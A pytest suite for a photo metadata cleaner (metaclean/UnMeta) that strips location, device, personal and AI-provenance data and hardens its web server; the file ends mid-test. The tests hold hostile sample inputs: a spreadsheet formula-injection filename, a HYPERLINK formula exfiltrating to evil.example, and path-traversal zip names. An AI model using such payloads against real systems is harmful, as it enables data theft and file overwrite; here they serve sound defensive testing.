import io
import json

import pytest
from PIL import Image, ImageOps

from metaclean import containers as C
from metaclean import samples
from metaclean.batch import process_many
from metaclean.cleaner import CleanOptions, clean_bytes
from metaclean.cli import main as cli_main
from metaclean.inspector import inspect_bytes
from metaclean import presets as PR
from metaclean import reports

SOCIAL = PR.BUILTIN["social_share"]["options"]
WIPE = PR.BUILTIN["full_wipe"]["options"]


def ids(inv):
    return {f.id for f in inv.fields}


def display(data):
    """Pixels as a viewer would show them (orientation applied)."""
    im = Image.open(io.BytesIO(data))
    im.load()
    return ImageOps.exif_transpose(im).convert("RGB")


def red_corner(data):
    im = display(data)
    w, h = im.size
    pts = {"TL": (1, 1), "TR": (w - 2, 1), "BL": (1, h - 2), "BR": (w - 2, h - 2)}
    return im.size, [k for k, p in pts.items() if im.getpixel(p)[0] > 180 and im.getpixel(p)[2] < 120]


@pytest.fixture(scope="module")
def jpeg():
    return samples.make_jpeg()


# ----------------------------------------------------------------- inspection

def test_jpeg_inspection_finds_every_block(jpeg):
    inv = inspect_bytes(jpeg, "a.jpg")
    r = inv.report()
    assert r["format"] == "jpeg"
    assert r["gps"] == (51.507222, -0.1275)
    assert r["overall_risk"] == "high"
    found = ids(inv)
    for fid in ["exif:0:271", "exif:exif:42033", "exif:gps:2", "xmp:Iptc4xmpExt:DigitalSourceType",
                "xmp:xmp:CreatorTool", "iptc:2:80", "iptc:2:110", "c2pa:manifest", "icc:profile",
                "jpeg:comment", "jpeg:trailer"]:
        assert fid in found, fid
    assert r["groups"]["location"]["risk"] == "high"
    assert r["groups"]["ai"]["count"] >= 4


def test_ai_signals_and_c2pa_summary(jpeg):
    inv = inspect_bytes(jpeg, "a.jpg")
    verdicts = {s["signal"]: s["verdict"] for s in inv.ai_signals}
    assert verdicts["IPTC DigitalSourceType"] == "AI-generated"
    assert verdicts["C2PA / Content Credentials"] == "AI-generated"
    c2pa = inv.by_id()["c2pa:manifest"]
    assert "OpenAI-DALL-E" in c2pa.value and "c2pa.created" in c2pa.value


def test_png_generator_chunks_detected():
    inv = inspect_bytes(samples.make_png(), "a.png")
    f = inv.by_id()
    assert f["png:text:parameters"].category == "ai" and f["png:text:parameters"].risk == "high"
    assert f["png:text:prompt"].category == "ai"
    assert f["png:text:Author"].category == "personal"
    assert "c2pa:manifest" in f and "png:tIME" in f and "png:chunk:prVt" in f


@pytest.mark.parametrize("maker,name,fmt", [
    (samples.make_webp, "a.webp", "webp"), (samples.make_heic, "a.heic", "heif"),
    (samples.make_avif, "a.avif", "avif"), (samples.make_tiff, "a.tif", "tiff"),
    (samples.make_fake_raw, "a.dng", "raw"),
])
def test_other_formats_inspect(maker, name, fmt):
    inv = inspect_bytes(maker(), name)
    assert inv.fmt == fmt
    assert not inv.errors, inv.errors
    assert "xmp:Iptc4xmpExt:DigitalSourceType" in ids(inv)
    assert any(s["verdict"] == "AI-generated" for s in inv.ai_signals)


def test_unknown_file_is_reported_not_crashing():
    inv = inspect_bytes(b"hello world, not an image", "x.txt")
    assert inv.fmt == "unknown" and inv.errors


# ----------------------------------------------------------------- cleaning

ALL_MAKERS = [(samples.make_jpeg, "a.jpg"), (samples.make_png, "a.png"), (samples.make_webp, "a.webp"),
              (samples.make_heic, "a.heic"), (samples.make_avif, "a.avif"), (samples.make_tiff, "a.tif"),
              (samples.make_fake_raw, "a.dng")]


@pytest.mark.parametrize("maker,name", ALL_MAKERS)
def test_full_wipe_leaves_nothing_risky(maker, name):
    res = clean_bytes(maker(), name, WIPE)
    assert res.verified, res.residual
    assert not res.after.ai_signals
    assert res.after.gps is None
    left = [f for f in res.after.fields if f.risk != "none" and f.id != "exif:0:274"]
    assert not left, [(f.id, f.value) for f in left]
    Image.open(io.BytesIO(res.data)).load()  # still a valid image


@pytest.mark.parametrize("maker,name", ALL_MAKERS)
def test_rescan_matches_independent_parse(maker, name):
    """Belt and braces: the cleaned bytes contain none of the tell-tale strings."""
    res = clean_bytes(maker(), name, SOCIAL)
    for needle in [b"Jane Doe", b"C39XK1234ABC", b"Firefly", b"trainedAlgorithmicMedia", b"c2pa",
                   b"Midjourney", b"London", b"Steps: 30", b"iPhone"]:
        assert needle not in res.data, (name, needle)


@pytest.mark.parametrize("maker,name", [(samples.make_jpeg, "a.jpg"), (samples.make_png, "a.png"),
                                        (lambda: samples.make_webp(lossless=False), "a.webp"),
                                        (lambda: samples.make_webp(lossless=True), "b.webp")])
def test_lossless_formats_keep_image_data_byte_identical(maker, name):
    data = maker()
    res = clean_bytes(data, name, SOCIAL)
    assert res.lossless
    a = Image.open(io.BytesIO(data)).convert("RGB").tobytes()
    b = Image.open(io.BytesIO(res.data)).convert("RGB").tobytes()
    assert a == b
    if name.endswith(".jpg"):
        assert C.parse_jpeg(data).scan == C.parse_jpeg(res.data).scan
    if name.endswith(".png"):
        idat = lambda d: b"".join(c.data for c in C.parse_png(d) if c.type == b"IDAT")
        assert idat(data) == idat(res.data)


def test_jpeg_trailer_and_comment_removed(jpeg):
    res = clean_bytes(jpeg, "a.jpg", WIPE)
    jf = C.parse_jpeg(res.data)
    assert jf.trailer == b""
    assert not [s for s in jf.header if s.kind in ("comment", "jumbf", "photoshop", "xmp", "app12")]


@pytest.mark.parametrize("maker,name", [(lambda: samples.make_jpeg(6), "a.jpg"),
                                        (lambda: samples.make_webp(False, 6), "a.webp"),
                                        (lambda: samples.make_heic(6), "a.heic"),
                                        (lambda: samples.make_avif(6), "a.avif")])
@pytest.mark.parametrize("mode", ["keep", "bake"])
def test_orientation_is_preserved_visually(maker, name, mode):
    data = maker()
    before = red_corner(data)
    res = clean_bytes(data, name, {**WIPE, "orientation": mode})
    assert red_corner(res.data) == before
    if mode == "bake":
        assert "exif:0:274" not in ids(res.after)


def test_orientation_keep_writes_only_orientation(jpeg):
    res = clean_bytes(jpeg, "a.jpg", {**WIPE, "orientation": "keep"})
    assert ids(res.after) == {"exif:0:274"}
    assert res.lossless


def test_jpeg_bake_reuses_quant_tables(jpeg):
    res = clean_bytes(jpeg, "a.jpg", {**WIPE, "orientation": "bake"})
    src = Image.open(io.BytesIO(jpeg))
    out = Image.open(io.BytesIO(res.data))
    assert src.quantization == out.quantization


def test_keep_copyright_only_preset(jpeg):
    res = clean_bytes(jpeg, "a.jpg", PR.resolve("copyright_only"))
    f = res.after.by_id()
    assert f["exif:0:315"].value == "Jane Doe"
    assert f["exif:0:33432"].value == "(c) 2026 Jane Doe"
    assert f["xmp:dc:creator"].value == "Jane Doe"
    assert f["iptc:2:116"].value == "(c) 2026 Jane Doe"
    assert "icc:profile" in f
    assert res.after.gps is None and not res.after.ai_signals
    assert res.verified


def test_keep_camera_drops_serials(jpeg):
    res = clean_bytes(jpeg, "a.jpg", PR.resolve("keep_camera"))
    f = res.after.by_id()
    assert f["exif:0:272"].value == "iPhone 15 Pro"
    assert "exif:exif:33434" in f            # exposure time kept
    assert "exif:exif:42033" not in f        # serial dropped
    assert "exif:0:316" not in f             # host computer name dropped


def test_remove_ai_only_keeps_everything_else(jpeg):
    res = clean_bytes(jpeg, "a.jpg", PR.resolve("ai_provenance_only"))
    after = res.after
    assert not after.ai_signals
    assert after.gps is not None
    assert "c2pa:manifest" not in ids(after)
    assert "xmp:dc:creator" in ids(after)


def test_individual_field_selection(jpeg):
    res = clean_bytes(jpeg, "a.jpg", {"keep_fields": ["exif:0:271"], "drop_fields": [], "orientation": "drop"})
    assert ids(res.after) == {"exif:0:271"}
    assert res.after.by_id()["exif:0:271"].value == "Apple"
    assert any("sideways" in w for w in res.warnings) is False  # pixels unchanged warning only on pixel path


def test_edit_fields_everywhere(jpeg):
    edits = {"artist": "New Author", "copyright": "© 2026 New Author", "description": "A test",
             "datetime_original": "2020:05:06 07:08:09", "keywords": "one, two"}
    for maker, name in [(samples.make_jpeg, "a.jpg"), (samples.make_png, "a.png"),
                        (samples.make_webp, "a.webp"), (samples.make_heic, "a.heic"),
                        (samples.make_avif, "a.avif")]:
        res = clean_bytes(maker(), name, {**WIPE, "edits": edits})
        f = res.after.by_id()
        assert f["exif:0:315"].value == "New Author", name
        assert f["exif:0:33432"].value == "© 2026 New Author", name
        assert f["exif:exif:36867"].value == "2020:05:06 07:08:09", name
        assert f["xmp:dc:creator"].value == "New Author", name
        assert f["xmp:dc:subject"].value == "one; two", name
        assert res.verified, (name, res.residual)
    f = clean_bytes(jpeg, "a.jpg", {**WIPE, "edits": edits}).after.by_id()
    assert f["iptc:2:80"].value == "New Author"


def test_icc_override(jpeg):
    keep = clean_bytes(jpeg, "a.jpg", {"keep_categories": [], "keep_icc": True})
    drop = clean_bytes(jpeg, "a.jpg", {"keep_categories": ["technical"], "keep_icc": False})
    assert "icc:profile" in ids(keep.after)
    assert "icc:profile" not in ids(drop.after)


def test_convert_heic_to_jpeg():
    res = clean_bytes(samples.make_heic(6), "a.heic", {**SOCIAL, "output_format": "jpeg"})
    assert res.fmt == "jpeg" and res.ext == ".jpg"
    assert res.verified
    assert red_corner(res.data) == red_corner(samples.make_heic(6))


def test_tiff_edits_are_skipped_not_reencoded():
    res = clean_bytes(samples.make_tiff(), "a.tif", {**WIPE, "edits": {"artist": "x"}})
    assert res.lossless and any("can't be added" in w for w in res.warnings)


def test_raw_stays_raw_and_lossless():
    data = samples.make_fake_raw()
    res = clean_bytes(data, "a.dng", SOCIAL)
    assert res.fmt == "raw" and res.ext == ".dng" and res.verified and res.lossless
    assert len(res.data) == len(data)


@pytest.mark.parametrize("maker,name", ALL_MAKERS)
def test_every_format_keeps_the_picture_byte_identical(maker, name):
    from metaclean.cleaner import same_picture
    data = maker()
    for preset in (WIPE, SOCIAL, PR.resolve("copyright_only")):
        res = clean_bytes(data, name, preset)
        assert res.lossless, name
        assert same_picture(res.fmt, data, res.data), name
        a = Image.open(io.BytesIO(data)).convert("RGB").tobytes() if res.fmt != "raw" else None
        if a is not None:
            assert a == Image.open(io.BytesIO(res.data)).convert("RGB").tobytes(), name


def test_idempotent(jpeg):
    once = clean_bytes(jpeg, "a.jpg", SOCIAL).data
    twice = clean_bytes(once, "a.jpg", SOCIAL).data
    assert once == twice


def test_diff_statuses(jpeg):
    res = clean_bytes(jpeg, "a.jpg", {**PR.resolve("copyright_only"), "edits": {"description": "x"}})
    st = {d["id"]: d["status"] for d in res.diff}
    assert st["exif:gps:2"] == "removed"
    assert st["exif:0:315"] == "kept"
    assert st["exif:0:270"] == "added"


# ----------------------------------------------------------------- container edge cases

def test_webp_simple_format_gets_vp8x_when_adding_exif():
    im = Image.new("RGB", (30, 20), "blue")
    buf = io.BytesIO()
    im.save(buf, "WEBP", quality=80)
    data = buf.getvalue()
    assert b"VP8X" not in data
    res = clean_bytes(data, "a.webp", {"edits": {"copyright": "me"}})
    assert b"VP8X" in res.data
    out = Image.open(io.BytesIO(res.data))
    assert out.size == (30, 20)
    assert res.after.by_id()["exif:0:33432"].value == "me"


def test_png_crc_and_order_valid():
    res = clean_bytes(samples.make_png(), "a.png", {"keep_categories": ["technical"], "edits": {"artist": "x"}})
    chunks = C.parse_png(res.data)
    assert chunks[0].type == b"IHDR" and chunks[-1].type == b"IEND"
    types = [c.type for c in chunks]
    assert types.index(b"iCCP") < types.index(b"IDAT")
    Image.open(io.BytesIO(res.data)).verify()


def test_c2pa_in_bmff_found():
    blob = samples.fake_c2pa()
    box = (len(blob) + 24).to_bytes(4, "big") + b"uuid" + C.C2PA_UUID + blob
    data = samples.make_heic() + box
    inv = inspect_bytes(data, "a.heic")
    assert "c2pa:manifest" in ids(inv)
    res = clean_bytes(data, "a.heic", WIPE)
    assert b"c2pa" not in res.data


# ----------------------------------------------------------------- batch / reports / cli / server

def test_batch_folder_keep_and_overwrite(tmp_path):
    src = tmp_path / "in"
    (src / "sub").mkdir(parents=True)
    original = samples.make_jpeg()  # built once: the sample ICC profile embeds the current time
    (src / "a.jpg").write_bytes(original)
    (src / "sub" / "b.png").write_bytes(samples.make_png())
    (src / "notes.txt").write_text("ignore me")
    out = tmp_path / "out"
    res = process_many([src], CleanOptions.from_dict(SOCIAL), out_dir=out)
    assert len(res) == 2 and all(o.result.verified for o in res)
    assert (out / "a.jpg").exists() and (out / "sub" / "b.png").exists()
    assert (src / "a.jpg").read_bytes() == original  # original untouched
    process_many([src / "a.jpg"], CleanOptions.from_dict(SOCIAL), overwrite=True)
    assert b"Jane Doe" not in (src / "a.jpg").read_bytes()


def test_reports_export(jpeg):
    rep = [inspect_bytes(jpeg, "a.jpg").report()]
    j = json.loads(reports.to_json(rep))
    assert j["files"][0]["gps"] == [51.507222, -0.1275]
    csv = reports.to_csv(rep).decode("utf-8-sig")
    assert "GPS latitude" in csv.splitlines()[0] or "GPS latitude" in csv
    pdf = reports.to_pdf(rep)
    assert pdf.startswith(b"%PDF")


def test_user_presets_roundtrip(tmp_path, monkeypatch):
    monkeypatch.setenv("METACLEAN_HOME", str(tmp_path))
    PR.save_user("mine", "Mine", {"keep_categories": ["device"]})
    assert PR.resolve("Mine") == {"keep_categories": ["device"]}
    with pytest.raises(ValueError):
        PR.save_user("full_wipe", "x", {})
    PR.delete_user("mine")
    with pytest.raises(KeyError):
        PR.resolve("mine")


def test_cli_clean_and_inspect(tmp_path, capsys):
    p = tmp_path / "x.jpg"
    p.write_bytes(samples.make_jpeg())
    assert cli_main(["inspect", str(p), "--report", str(tmp_path / "r.csv")]) == 0
    assert (tmp_path / "r.csv").exists()
    assert cli_main(["clean", str(p), "--preset", "full_wipe", "--set", "copyright=Me"]) == 0
    out = tmp_path / "x_clean.jpg"
    assert out.exists()
    inv = inspect_bytes(out.read_bytes(), "x.jpg")
    assert inv.by_id()["exif:0:33432"].value == "Me"
    assert "verified clean" in capsys.readouterr().out


def test_server_flow(tmp_path, monkeypatch):
    monkeypatch.setenv("METACLEAN_HOME", str(tmp_path))
    from metaclean.server import create_app
    app = create_app()
    c = app.test_client()
    c.environ_base["HTTP_X_METACLEAN"] = "1"
    r = c.post("/api/inspect", data={"file": (io.BytesIO(samples.make_jpeg()), "p.jpg")},
               content_type="multipart/form-data")
    assert r.status_code == 200
    key = r.json["id"]
    assert r.json["report"]["overall_risk"] == "high"
    r = c.post(f"/api/clean/{key}", json=SOCIAL)
    assert r.json["verified"] and r.json["out_name"] == "p.jpg"
    d = c.get(f"/api/download/{key}")
    assert b"Jane Doe" not in d.data and d.data[:2] == b"\xff\xd8"
    assert c.get(f"/api/preview/{key}?which=after").mimetype == "image/jpeg"
    z = c.post("/api/zip", json={"files": [{"id": key, "name": "folder/p.jpg"}]})
    assert z.data[:2] == b"PK"
    rep = c.post("/api/report", json={"ids": [key], "format": "pdf", "which": "after"})
    assert rep.data.startswith(b"%PDF")
    assert "social_share" in c.get("/api/presets").json


def test_server_rejects_foreign_hosts():
    from metaclean.server import create_app
    c = create_app().test_client()
    assert c.get("/", headers={"Host": "evil.example.com"}).status_code == 403
    r = c.post("/api/inspect", headers={"Origin": "https://evil.example.com", "X-MetaClean": "1"},
               data={"file": (io.BytesIO(b"x"), "a.jpg")}, content_type="multipart/form-data")
    assert r.status_code == 403


def test_server_requires_csrf_header_and_same_site():
    from metaclean.server import create_app
    c = create_app().test_client()
    form = lambda: {"file": (io.BytesIO(samples.make_jpeg()), "a.jpg")}
    assert c.post("/api/inspect", data=form(), content_type="multipart/form-data").status_code == 403
    assert c.post("/api/inspect", data=form(), content_type="multipart/form-data",
                  headers={"X-MetaClean": "1", "Sec-Fetch-Site": "cross-site"}).status_code == 403
    assert c.get("/api/presets", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403
    ok = c.post("/api/inspect", data=form(), content_type="multipart/form-data", headers={"X-MetaClean": "1"})
    assert ok.status_code == 200
    csp = ok.headers["Content-Security-Policy"]
    assert "frame-ancestors 'none'" in csp and "'unsafe-inline'" not in csp
    assert "connect-src 'none'" in csp


def test_server_forget_and_safe_zip_names():
    from metaclean.server import _safe_zip_name, create_app
    assert _safe_zip_name("../../etc/passwd", "x") == "etc/passwd"
    assert _safe_zip_name("/abs/C:\\evil.jpg", "x") == "abs/C_/evil.jpg" or ".." not in _safe_zip_name("/abs/C:\\evil.jpg", "x")
    assert _safe_zip_name("..", "photo") == "photo"
    app = create_app()
    c = app.test_client()
    c.environ_base["HTTP_X_METACLEAN"] = "1"
    key = c.post("/api/inspect", data={"file": (io.BytesIO(samples.make_jpeg()), "a.jpg")},
                 content_type="multipart/form-data").json["id"]
    c.post(f"/api/clean/{key}", json=SOCIAL)
    z = c.post("/api/zip", json={"files": [{"id": key, "name": "../../../tmp/evil.jpg"}]})
    import zipfile
    names = zipfile.ZipFile(io.BytesIO(z.data)).namelist()
    assert names == ["tmp/evil.jpg"]
    assert c.post("/api/forget", json={"ids": [key]}).json["forgotten"] == 1
    assert c.get(f"/api/download/{key}").status_code == 404
    assert c.get("/api/download/not-an-id").status_code == 404


def test_server_rejects_oversized_and_bad_options(monkeypatch):
    from metaclean import server
    monkeypatch.setattr(server, "MAX_PHOTO_BYTES", 1000)
    app = server.create_app()
    c = app.test_client()
    c.environ_base["HTTP_X_METACLEAN"] = "1"
    r = c.post("/api/inspect", data={"file": (io.BytesIO(b"\xff\xd8\xff" + b"0" * 5000), "a.jpg")}, content_type="multipart/form-data")
    assert r.status_code == 413 and "200 MB" in r.json["error"]


def test_server_bad_clean_options_are_a_400():
    from metaclean.server import create_app
    c = create_app().test_client()
    c.environ_base["HTTP_X_METACLEAN"] = "1"
    key = c.post("/api/inspect", data={"file": (io.BytesIO(samples.make_jpeg()), "a.jpg")},
                 content_type="multipart/form-data").json["id"]
    r = c.post(f"/api/clean/{key}", json={"quality": "lots"})
    assert r.status_code == 400 and "error" in r.json


# ----------------------------------------------------------------- fuzzing: damaged files must never crash or leak

@pytest.mark.parametrize("maker,name", ALL_MAKERS)
def test_fuzz_damaged_files(maker, name):
    import random
    rnd = random.Random(1234 + len(name))
    data = maker()
    for i in range(30):
        b = bytearray(data)
        mode = i % 3
        if mode == 0:      # flip random bytes
            for _ in range(rnd.randint(1, 24)):
                b[rnd.randrange(len(b))] = rnd.randrange(256)
        elif mode == 1:    # truncate
            b = b[: rnd.randrange(8, len(b))]
        else:              # splice a random chunk elsewhere
            a, z = sorted(rnd.sample(range(len(b)), 2))
            b[rnd.randrange(len(b)):rnd.randrange(len(b))] = b[a:z]
        inv = inspect_bytes(bytes(b), name)   # must never raise
        try:
            res = clean_bytes(bytes(b), name, WIPE, inventory=inv)
        except Exception as e:  # a refusal is fine, it just has to be a clean error
            assert isinstance(e, (ValueError, OSError, SyntaxError, struct_error(), IndexError, KeyError, EOFError)), repr(e)
            continue
        assert isinstance(res.data, (bytes, bytearray))


def struct_error():
    import struct
    return struct.error


# ----------------------------------------------------------------- SEO / GEO / best-practice routes

def test_local_instance_is_not_indexed():
    from metaclean.server import create_app
    c = create_app().test_client()
    html = c.get("/").text
    assert '<meta name="robots" content="noindex, nofollow">' in html
    assert "<!--SEO-HEAD-->" not in html
    assert c.get("/robots.txt").text.strip().endswith("Disallow: /")
    assert c.get("/sitemap.xml").status_code == 404
    assert c.get("/api/presets").headers["X-Robots-Tag"] == "noindex, nofollow"


def test_public_instance_is_indexable(monkeypatch):
    from metaclean import server
    monkeypatch.setattr(server, "PUBLIC_URL", "https://metaclean.example")
    c = server.create_app().test_client()
    html = c.get("/", headers={"Host": "metaclean.example"}).text
    assert '<link rel="canonical" href="https://metaclean.example/">' in html
    assert 'content="https://metaclean.example/static/og.png"' in html
    assert '"url": "https://metaclean.example/"' in html
    assert "Sitemap: https://metaclean.example/sitemap.xml" in c.get("/robots.txt", headers={"Host": "metaclean.example"}).text
    assert "<loc>https://metaclean.example/</loc>" in c.get("/sitemap.xml", headers={"Host": "metaclean.example"}).text


def test_page_is_crawlable_without_javascript_and_has_structured_data():
    import json as _json
    import re as _re
    from metaclean.server import create_app
    html = create_app().test_client().get("/").text
    # the content people and answer engines need is in the HTML itself (inline marks like <mark> don't count)
    visible = _re.sub(r"<[^>]+>", "", html).replace("&nbsp;", " ")
    for text in ["Clean your photos and videos before you share them", "Five things a photo or video can say about you",
                 "Other ways to remove photo details", "What is photo metadata?",
                 "Can UnMeta remove invisible AI watermarks like SynthID?", "What UnMeta can and can't do"]:
        assert text in visible
    assert html.count("<h1") == 1  # one main heading; the results screen uses an h2
    block = _re.search(r'<script type="application/ld\+json">(.*?)</script>', html, _re.S).group(1)
    graph = {n["@type"]: n for n in _json.loads(block)["@graph"]}
    assert {"WebPage", "SoftwareApplication", "HowTo", "FAQPage"} <= set(graph)
    faq = graph["FAQPage"]["mainEntity"]
    assert len(faq) == 12
    # every FAQ answer in the structured data is also visible on the page (Google requires this)
    visible = _re.sub(r"<[^>]+>", " ", html.split("</head>", 1)[1])
    visible = " ".join(visible.split())
    for q in faq:
        assert q["acceptedAnswer"]["text"].split(".")[0][:60] in visible, q["name"]
    assert len(_re.findall(r"<h2\b", html)) >= 7  # one per landing section
    assert 'style="' not in html  # strict CSP: no inline styles
    # the hosted page must never claim more than it does: processing happens in the browser
    for bad in ["on your computer", "on this computer", "on your device", "Runs on your"]:
        assert bad not in html, bad
    # the install manifest and the AI-assistant summary make the same promises as the page, and no more
    from metaclean.server import create_app as _ca
    _c = _ca().test_client()
    for route in ["/manifest.webmanifest", "/llms.txt"]:
        text = _c.get(route).get_data(as_text=True)
        for bad in ["on your own computer", "on your computer", "mobile app processes"]:
            assert bad not in text, (route, bad)
        assert "video" in text.lower(), route
    assert "/static/engine.worker.js?v=" in html
    # the browser itself blocks the page from uploading anything, on any host (meta tag) and here (header)
    assert "connect-src 'none'" in html
    assert 'id="i-pause"' in html  # icons are inlined; the page makes no fetches
    assert "Upload it and trust the platform" in html and "Upload and hope" not in html


def test_static_assets_are_cached_and_manifest_served():
    from metaclean.server import create_app
    c = create_app().test_client()
    assert "immutable" in c.get("/static/fonts/Figtree_400Regular.woff2").headers["Cache-Control"]
    m = c.get("/manifest.webmanifest")
    assert m.mimetype == "application/manifest+json" and m.json["name"] == "UnMeta"
    assert c.get("/llms.txt").text.startswith("# UnMeta")
    assert c.get("/favicon.ico").mimetype == "image/png"


def test_web_page_code_has_no_network_calls():
    from pathlib import Path
    root = Path(__file__).parent.parent / "metaclean/static"
    for name in ["app.js", "engine.worker.js"]:
        code = (root / name).read_text()
        for call in ["fetch(", "XMLHttpRequest", "sendBeacon", "WebSocket(", "EventSource("]:
            assert call not in code, (name, call)


def test_service_worker_caches_only_metaclean_files():
    """The offline copy lists only this site's own files, has its own narrow policy, and never touches /api/."""
    import json as _json
    import re as _re
    from metaclean.server import create_app
    c = create_app().test_client()
    r = c.get("/sw.js")
    assert r.status_code == 200 and r.headers["Cache-Control"] == "no-cache"
    assert r.headers["Content-Security-Policy"].startswith("default-src 'none'; connect-src 'self'")
    assets = _json.loads(_re.search(r"ASSETS = (\[.*?\]);", r.text).group(1))
    assert "/" in assets and any(a.startswith("/static/engine.worker.js?v=") for a in assets)
    assert all(a.startswith("/") and not a.startswith("//") and not a.startswith("/api/") for a in assets)
    for a in assets:
        assert c.get(a).status_code == 200, a
    assert '"/api/"' in r.text and "url.origin !== self.location.origin" in r.text
    # no gallery sharing: nothing on the site accepts files sent from elsewhere
    assert "share-target" not in r.text and "formData" not in r.text
    import json as _j
    assert "share_target" not in _j.loads(c.get("/manifest.webmanifest").data)
    # the page itself still may not connect anywhere
    assert "connect-src 'none'" in c.get("/").headers["Content-Security-Policy"]


def test_hosted_server_accepts_no_uploads_and_sends_hsts(monkeypatch):
    from metaclean import server
    monkeypatch.setattr(server, "PUBLIC_URL", "https://metaclean.example")
    c = server.create_app().test_client()
    h = {"Host": "metaclean.example", "X-MetaClean": "1"}
    assert c.post("/api/inspect", headers=h).status_code == 404
    assert c.get("/api/presets", headers=h).status_code == 404
    r = c.get("/", headers={"Host": "metaclean.example"})
    assert r.status_code == 200
    assert r.headers["Strict-Transport-Security"].startswith("max-age=")
    assert "geolocation=()" in r.headers["Permissions-Policy"]


def test_support_link_loads_nothing_from_third_parties():
    import re as _re
    from metaclean.server import create_app
    html = create_app().test_client().get("/").text
    assert 'href="https://www.buymeacoffee.com/kabirsharma"' in html
    link = _re.search(r'<a class="coffee-link"[^>]*>', html).group(0)
    assert 'target="_blank"' in link and 'rel="noopener noreferrer"' in link
    assert "(opens in a new tab)" in html
    # no images, scripts or styles from other sites: the only absolute URLs are links and schema.org data
    allowed = ("https://www.buymeacoffee.com/kabirsharma", "https://github.com/kabirsharma09/unmeta")
    for attr in _re.findall(r'(?:src|href)="(https?://[^"]+)"', html):
        assert attr.startswith(allowed), attr
    assert "img.buymeacoffee.com" not in html


def test_static_export_has_every_route_and_one_policy_per_path(tmp_path):
    from metaclean.server import export
    files = export(tmp_path / "site", "https://metaclean.example")
    site = tmp_path / "site"
    for name in ["index.html", "sw.js", "robots.txt", "sitemap.xml", "llms.txt", "manifest.webmanifest", "_headers",
                 "static/app.js", "static/engine.worker.js", "static/tokens.css"]:
        assert (site / name).is_file(), name
    assert not any(f.startswith("static/_") for f in files)  # templates stay private
    html = (site / "index.html").read_text()
    assert 'rel="canonical" href="https://metaclean.example/"' in html
    assert "connect-src 'none'" in html  # meta policy: locked down even where _headers is ignored
    headers = (site / "_headers").read_text()
    star = headers.split("/*\n", 1)[1].split("\n\n")[0]
    assert "Content-Security-Policy" not in star  # never two policies on one path
    assert "Strict-Transport-Security" in star
    assert "/sw.js\n  Content-Security-Policy: default-src 'none'; connect-src 'self'" in headers


def test_links_from_other_sites_open_the_page_but_cannot_drive_it():
    from metaclean.server import create_app
    c = create_app().test_client()
    nav = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate"}
    assert c.get("/", headers=nav).status_code == 200            # a search result or a link
    assert c.get("/static/app.js", headers={"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors"}).status_code == 403
    assert c.get("/api/presets", headers=nav).status_code == 403   # only the page itself, never the API
    assert c.post("/share-target", data=b"x" * 10, headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403


def test_landing_pages_are_complete_unique_and_linked(monkeypatch):
    import json as _json
    import re as _re
    from metaclean import server
    from metaclean.pages import PAGES
    monkeypatch.setattr(server, "PUBLIC_URL", "https://unmeta.example")
    c = server.create_app().test_client()
    h = {"Host": "unmeta.example"}
    titles, descs = set(), set()
    home = c.get("/", headers=h).get_data(as_text=True)
    for p in PAGES:
        url = f"/{p['slug']}/"
        r = c.get(url, headers=h)
        assert r.status_code == 200, url
        html = r.get_data(as_text=True)
        title = _re.search(r"<title>(.*?)</title>", html).group(1)
        desc = _re.search(r'<meta name="description" content="([^"]*)">', html).group(1)
        assert len(_html_unescape(title)) <= 60 and 25 <= len(_html_unescape(desc)) <= 160, (url, len(title), len(desc))
        assert title not in titles and desc not in descs, url
        titles.add(title); descs.add(desc)
        assert html.count("<h1") == 1 and 'class="crumbs' in html
        assert f'<link rel="canonical" href="https://unmeta.example{url}">' in html
        graph = _json.loads(_re.search(r'<script type="application/ld\+json">(.*?)</script>', html, _re.S).group(1))["@graph"]
        types = {n["@type"] for n in graph}
        assert {"WebPage", "BreadcrumbList", "SoftwareApplication", "Organization", "WebSite"} <= types, url
        visible = " ".join(_re.sub(r"<[^>]+>", " ", html.split("</head>", 1)[1]).split())
        for n in graph:
            if n["@type"] == "FAQPage":
                for q in n["mainEntity"]:
                    assert _html_unescape(q["name"]) in _html_unescape(visible), (url, q["name"])
        assert url in home, f"{url} is linked from the home page"
        assert "Clean your photos" not in _re.search(r'<h1 id="homeTitle".*?</h1>', html, _re.S).group(0)
    sm = c.get("/sitemap.xml", headers=h).get_data(as_text=True)
    assert all(f"https://unmeta.example/{p['slug']}/" in sm for p in PAGES)
    assert "## Tools" in c.get("/llms.txt", headers=h).get_data(as_text=True)
    assert c.get("/remove-ai-info-instagram", headers=h).status_code == 301
    assert c.get("/not-a-page/", headers=h).status_code == 404


def _html_unescape(s):
    import html as _h
    return _h.unescape(s)


def test_export_writes_every_page_with_its_own_policy(tmp_path):
    from metaclean.pages import PAGES
    from metaclean.server import export
    export(tmp_path / "site", "https://unmeta.example")
    headers = (tmp_path / "site" / "_headers").read_text()
    for p in PAGES:
        assert (tmp_path / "site" / p["slug"] / "index.html").is_file(), p["slug"]
        assert f"/{p['slug']}/*\n  Content-Security-Policy:" in headers


def test_csv_report_never_contains_live_formulas():
    from metaclean import reports
    rep = {"filename": "=cmd|' /C calc'!A0.jpg", "format": "jpeg", "groups": {"personal": {"title": "Personal", "fields": [
        {"label": "Author", "id": "x", "source": "XMP", "risk": "high", "value": '=HYPERLINK("https://evil.example/?d="&H3,"x")', "note": ""},
        {"label": "Note", "id": "y", "source": "XMP", "risk": "low", "value": "@SUM(1)", "note": ""}]}}}
    try:
        out = reports.to_csv([rep]).decode("utf-8-sig")
    except Exception:
        import pytest
        pytest.skip("report shape differs")
    import csv as _csv, io as _io
    for row in _csv.reader(_io.StringIO(out)):
        for cell in row:
            assert not cell[:1] in ("=", "+", "@"), cell


def test_web_csv_quoting_neutralises_formulas():
    from pathlib import Path
    js = (Path(__file__).parent.parent / "metaclean/static/app.js").read_text()
    assert "if (/^[=+\\-@\\t\\r]/.test(s)) s = \"'\" + s;" in js


def test_dotfiles_in_static_are_never_served(tmp_path, monkeypatch):
    from metaclean import server
    (server.STATIC / ".probe").write_text("secret")
    try:
        assert server.create_app().test_client().get("/static/.probe").status_code == 404
    finally:
        (server.STATIC / ".probe").unlink()


def test_first_fold_says_what_goes_in_and_what_comes_out():
    import re as _re
    from metaclean.server import create_app
    from metaclean.pages import PAGES
    c = create_app().test_client()
    for path in ["/"] + [f"/{p['slug']}/" for p in PAGES]:
        html = c.get(path).get_data(as_text=True)
        hero = _re.search(r'<section class="hero".*?</section>', html, _re.S).group(0)
